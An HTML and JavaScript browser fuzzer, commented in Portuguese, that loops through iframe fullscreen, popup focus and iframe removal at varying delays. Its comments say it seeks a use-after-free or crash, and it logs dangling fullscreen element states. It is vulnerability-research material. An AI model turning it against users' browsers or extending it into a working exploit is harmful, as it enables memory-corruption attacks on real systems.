<html>
<body>
<button id="run">Run V4 (Auto-Loop)</button>
<button id="stop">Stop</button>
<div id="status">Ready</div>
<div id="log" style="font-family:monospace;font-size:11px;height:250px;overflow-y:auto;border:1px solid #ccc;padding:4px"></div>
<script>
/*
  FUZZER: estrutura IDÊNTICA ao teste original (popup + foco + setInterval)
  Varia o delay do primeiro setTimeout de 0 a 600ms para encontrar
  a janela de timing que causa UAF ou crash.
*/

var running = false;
var iteration = 0;
var delay1 = 0;   // delay antes do bloco de foco
var delay2 = 300; // delay fixo entre foco e popup.close (igual ao original)

function log(msg) {
    var div = document.getElementById("log");
    var line = document.createElement("div");
    line.textContent = "[i=" + iteration + " d1=" + delay1 + "ms] " + msg;
    div.appendChild(line);
    div.scrollTop = div.scrollHeight;
}

function runIteration() {
    if (!running) return;
    iteration++;

    var iframe = document.createElement("iframe");
    iframe.style.cssText = "width:100px;height:100px;position:fixed;top:-300px;left:-300px";
    document.body.appendChild(iframe);

    var popup = null;
    var focusTimer = null;
    var done = false;

    function finish(msg) {
        if (done) return;
        done = true;
        log(msg);
        if (focusTimer) clearInterval(focusTimer);
        if (iframe.parentNode) iframe.remove();
        if (popup && !popup.closed) try { popup.close(); } catch(e) {}

        // Incrementa delay a cada 3 iterações
        if (iteration % 3 === 0) {
            delay1 = delay1 >= 600 ? 0 : delay1 + 25;
        }

        if (running) setTimeout(runIteration, 400);
    }

    iframe.onload = function() {
        var doc = iframe.contentDocument;
        doc.open();
        doc.write(
            '<!DOCTYPE html><html><body>' +
            '<div style="width:200px;height:150px;background:red"></div>' +
            '</body></html>'
        );
        doc.close();

        // Monitora state pós-remove via fullscreenchange
        document.addEventListener('webkitfullscreenchange', function onFsChange() {
            document.removeEventListener('webkitfullscreenchange', onFsChange);
            var el = document.webkitFullscreenElement;
            if (el) {
                try {
                    finish("DANGLING PTR — tag=" + el.tagName + " clientW=" + el.clientWidth);
                } catch(e) {
                    finish("EXCEPTION no dangling: " + e);
                }
            }
        });

        popup = window.open("", "_blank", "width=400,height=300");
        if (!popup) {
            finish("popup bloqueado");
            return;
        }
        popup.document.open();
        popup.document.write('<!DOCTYPE html><html><body><p>Popup</p></body></html>');
        popup.document.close();

        iframe.contentDocument.documentElement.webkitRequestFullscreen();

        // Estrutura IDÊNTICA ao teste original
        setTimeout(function() {
            if (!popup || popup.closed) {
                finish("popup já fechou");
                return;
            }
            popup.focus();
            window.focus();
            try { iframe.contentWindow.focus(); } catch(e) {}

            setTimeout(function() {
                if (popup && !popup.closed) popup.close();

                focusTimer = setInterval(function() {
                    if (!popup || popup.closed) {
                        clearInterval(focusTimer);
                        focusTimer = null;

                        // Captura state antes de remover
                        var fsEl = document.webkitFullscreenElement;
                        var fsState = fsEl ? "ACTIVE tag=" + fsEl.tagName : "null";

                        iframe.remove();

                        // Verifica state DEPOIS de remover
                        setTimeout(function() {
                            var fsAfter = document.webkitFullscreenElement;
                            if (fsAfter) {
                                try {
                                    finish("POST-REMOVE fs=" + fsAfter.tagName +
                                           " w=" + fsAfter.clientWidth +
                                           " [pre=" + fsState + "]");
                                } catch(e) {
                                    finish("POST-REMOVE EX: " + e + " [pre=" + fsState + "]");
                                }
                            } else {
                                finish("clean [pre=" + fsState + "]");
                            }
                        }, 50);
                    }
                }, 20);
            }, delay2);
        }, delay1);
    };
}

document.getElementById("run").onclick = function() {
    if (running) return;
    running = true;
    iteration = 0;
    delay1 = 0;
    document.getElementById("log").innerHTML = "";
    document.getElementById("status").innerHTML = "Running...";
    runIteration();
};

document.getElementById("stop").onclick = function() {
    running = false;
    document.getElementById("status").innerHTML =
        "Parado — iter=" + iteration + " último delay1=" + delay1 + "ms";
};
</script>
</body>
</html>
